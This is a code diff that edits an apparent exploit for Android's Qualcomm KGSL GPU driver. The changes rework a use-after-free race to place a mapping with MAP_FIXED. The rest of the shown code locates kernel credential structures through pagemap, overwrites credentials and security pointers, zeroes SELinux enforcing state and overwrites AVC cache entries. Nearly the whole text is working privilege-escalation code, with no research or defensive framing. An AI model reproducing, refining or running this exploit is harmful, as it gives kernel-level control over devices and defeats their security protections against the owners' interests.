@@ -237,11 +237,10 @@ static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
 
 static void *race_thread(void *arg) {
     (void)arg;
-    // 競合を起こしやすくするため、UAF_ADDR 付近のアドレスを import 対象に変更
     struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = UAF_ADDR + 0x1000 };
     struct kgsl_gpuobj_import imp = {
         .priv = (uint64_t)&uaddr,
-        .priv_len = 0x10000, // サイズを小さくする
+        .priv_len = 0x10000,
         .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
         .type = KGSL_USER_MEM_TYPE_ADDR,
     };
@@ -348,7 +347,6 @@ int main(int argc, char **argv) {
     if (uaf_m == MAP_FAILED) die("mmap UAF");
     munmap(uaf_m, UAF_SIZE);
 
-    // BOGUS_ADDR は依然として必要（マッピングのヒントとして）
     if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
 
@@ -361,45 +359,40 @@ int main(int argc, char **argv) {
         (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
         (unsigned long)PLACEHOLDER_ADDR);
 
-    printf("[*] Phase 2: Race (without MAP_FIXED)\n");
+    printf("[*] Phase 2: Race with MAP_FIXED over UAF region\n");
     int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
 
     pthread_t thr;
     if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
 
     void *overlap_map = MAP_FAILED;
-    int hit = 0;
-    const int MAX_LOOP = 50000000;
-    for (int i = 0; i < MAX_LOOP; i++) {
-        void *r = mmap(NULL, OVERLAP_SIZE, PROT_READ|PROT_WRITE,
-                       MAP_SHARED, kgsl_fd, (off_t)ov_id << 12);
-        if (r == MAP_FAILED) {
-            if (i % 5000000 == 0) printf("  race %d/%d errno=%d\n", i, MAX_LOOP, errno);
-            usleep(1);
-            continue;
-        }
-        if ((uintptr_t)r >= UAF_ADDR && (uintptr_t)r + OVERLAP_SIZE <= UAF_ADDR + UAF_SIZE) {
+    const size_t step = 0x1000;
+    const uintptr_t start = UAF_ADDR;
+    const uintptr_t end = UAF_ADDR + UAF_SIZE - OVERLAP_SIZE;
+    for (uintptr_t addr = start; addr < end; addr += step) {
+        void *r = mmap((void*)addr, OVERLAP_SIZE, PROT_READ|PROT_WRITE,
+                       MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ov_id << 12);
+        if (r != MAP_FAILED) {
             overlap_map = r;
-            hit = 1;
-            printf("[+] Race won! overlap mapped at 0x%lx\n", (unsigned long)r);
+            printf("[+] Race won! mapped at 0x%lx\n", (unsigned long)r);
             break;
-        } else {
-            munmap(r, OVERLAP_SIZE);
-            if (i % 5000000 == 0) printf("  race %d: mapping at 0x%lx not in UAF\n", i, (unsigned long)r);
         }
-        usleep(1);
+        // if errno is ENOMEM, continue; other errors might be temporary
+        if (errno != ENOMEM && errno != EAGAIN) {
+            printf("  mmap at 0x%lx failed with errno=%d\n", addr, errno);
+        }
     }
 
     race_done = 1;
     pthread_join(thr, NULL);
 
-    if (!hit || overlap_map == MAP_FAILED) {
-        printf("[-] Race failed: no overlap mapping in UAF region\n");
+    if (overlap_map == MAP_FAILED) {
+        printf("[-] Race failed: could not map any address in UAF region\n");
         close(kgsl_fd);
         return 1;
     }
 
-    // 物理アドレスを取得 (overlap_map がマップされている)
+    // Get physical address via pagemap
     int pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
     if (pagemap_fd < 0) die("open pagemap");
     uint64_t pagemap_entry;
@@ -495,8 +488,8 @@ int main(int argc, char **argv) {
     uint64_t dst_ga = 0, dst_flags = 0;
     gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags);
 
-    uint64_t scan_start = UAF_ADDR + 0x1000;
-    uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
+    uint64_t scan_start = (uintptr_t)overlap_map + 0x1000;
+    uint64_t end_va = (uintptr_t)overlap_map + OVERLAP_SIZE - 0x1000;
     uint64_t cred_pages[32];
     int cred_offs[32];
     uint64_t fake_sec_addrs[32];
@@ -545,7 +538,7 @@ int main(int argc, char **argv) {
             cred_pages[n_cred] = va;
             cred_offs[n_cred] = cred_off_found;
 
-            uint64_t pa_cred = overlap_base_pa + (va - (uint64_t)overlap_map);
+            uint64_t pa_cred = overlap_base_pa + (va - (uintptr_t)overlap_map);
             uint64_t kva_cred = page_offset + pa_cred;
             fake_sec_addrs[n_cred] = kva_cred + 0xFB0;
             printf("  fake_sec_addr = 0x%lx\n", (unsigned long)fake_sec_addrs[n_cred]);
@@ -635,10 +628,10 @@ int main(int argc, char **argv) {
             wait_timestamp(kgsl_fd, ctx_id, ts);
     }
 
-    flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+    flush_dc_civac_range((void*)(uintptr_t)overlap_map, OVERLAP_SIZE);
     printf("[+] Cred overwrite and security pointer redirection done\n");
 
-    // Phase 9, 9b, 10, 11 are unchanged (fallback attempts)
+    // Phase 9, 9b, 10, 11 unchanged (fallback attempts)
     printf("[*] Phase 9: Aggressive SELinux disabling (fallback)\n");
 
     memset(ib_m, 0, 0x10000);
@@ -694,7 +687,7 @@ int main(int argc, char **argv) {
         __sync_synchronize();
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
             wait_timestamp(kgsl_fd, ctx_id, ts);
-        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+        flush_dc_civac_range((void*)(uintptr_t)overlap_map, OVERLAP_SIZE);
         printf("[+] SELinux enforcing flag zeroed\n");
     } else {
         printf("  Could not find enforcing flag; zeroing first 0x%x bytes of selinux_state\n", SELINUX_STATE_SCAN_SIZE);
@@ -714,14 +707,14 @@ int main(int argc, char **argv) {
         __sync_synchronize();
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
             wait_timestamp(kgsl_fd, ctx_id, ts);
-        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+        flush_dc_civac_range((void*)(uintptr_t)overlap_map, OVERLAP_SIZE);
         printf("[+] Zeroed %d bytes of selinux_state\n", SELINUX_STATE_SCAN_SIZE);
     }
 
     printf("[*] Phase 9b: AVC bypass fallback\n");
     uint64_t avc_vas[256];
     int n_avc = 0;
-    uint64_t avc_scan_start = UAF_ADDR;
+    uint64_t avc_scan_start = (uintptr_t)overlap_map;
     for (uint64_t va = avc_scan_start; va < end_va && n_avc < 256; va += 0x1000) {
         if (((va - avc_scan_start) & 0xFFFFF) == 0) printf(".");
         memset(ib_m, 0, 0x10000);
@@ -784,7 +777,7 @@ int main(int argc, char **argv) {
             if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
                 wait_timestamp(kgsl_fd, ctx_id, ts);
         }
-        flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+        flush_dc_civac_range((void*)(uintptr_t)overlap_map, OVERLAP_SIZE);
         printf("[+] AVC allowed overwritten\n");
     }
 
@@ -809,7 +802,7 @@ int main(int argc, char **argv) {
                 __sync_synchronize();
                 if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
                     wait_timestamp(kgsl_fd, ctx_id, ts);
-                flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
+                flush_dc_civac_range((void*)(uintptr_t)overlap_map, OVERLAP_SIZE);
                 printf("  Zeroed selinux_state+0\n");
             }
         }
